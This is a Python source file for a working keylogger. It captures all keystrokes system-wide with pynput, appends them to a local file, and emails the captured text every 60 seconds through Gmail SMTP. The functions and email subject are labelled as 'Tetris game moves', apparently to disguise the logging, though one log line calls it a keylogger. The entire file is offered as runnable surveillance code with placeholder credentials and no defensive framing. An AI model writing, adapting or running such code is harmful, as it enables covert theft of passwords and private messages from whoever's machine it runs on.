import threading
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Listener, Key

# Setting up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Email configuration
sender_email = "test@gmail.com"
sender_password = "password"
smtp_server = "smtp.gmail.com"
smtp_port = 587
receiver_email = "test@gmail.com"

moves_filename = "script.txt"
game_moves = []  # List to accumulate game moves
email_interval = 60  # Interval for sending emails in seconds


def send_game_email(subject, body):
    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)

        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        server.sendmail(sender_email, receiver_email, msg.as_string())
        logger.info(f"Email sent to {receiver_email}")
        server.quit()  # Close SMTP connection after sending
    except smtplib.SMTPException as e:
        logger.error(f"SMTP error: {e}")
    except Exception as e:
        logger.error(f"Failed to send email: {e}")


def save_game_moves():
    global game_moves
    try:
        if game_moves:
            moves_text = ''.join(game_moves)
            with open(moves_filename, "a") as file:
                file.write(moves_text + "\n")
            subject = "Tetris Game Moves"
            body = f"New game moves recorded in Tetris:\n{moves_text}"
            send_game_email(subject, body)
            game_moves = []  # Clear the list after sending the email
    except Exception as e:
        logger.error(f"Error writing to file or sending email: {e}")


def on_tetris_key_press(key):
    global game_moves
    try:
        if hasattr(key, 'char') and key.char is not None:
            char = key.char
            game_moves.append(char)  # Add character to the list
    except Exception as e:
        logger.error(f"Error processing key press: {e}")


def start_email_timer():
    threading.Timer(email_interval, start_email_timer).start()
    save_game_moves()


def start_tetris_key_listener():
    with Listener(on_press=on_tetris_key_press) as listener:
        start_email_timer()
        listener.join()


def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    elif key == 'Key.shift':
        key = ''
    elif key == 'Key.enter':
        key = '\n'
    elif key == 'Key.esc':
        return False

    with open("script.txt", 'a') as f:
        if key:
            f.write(key)
    return True

def main():
    try:
        thread1 = threading.Thread(target=start_tetris_key_listener)
        thread1.start()

        with Listener(on_press=log_keystroke) as listener:
            if not listener.join():
                logger.info("Keylogger terminated by pressing the Esc key.")

    except KeyboardInterrupt:
        logger.info("Program terminated by user")
    except Exception as e:
        logger.error(f"Error: {e}")


if __name__ == "__main__":
    main()
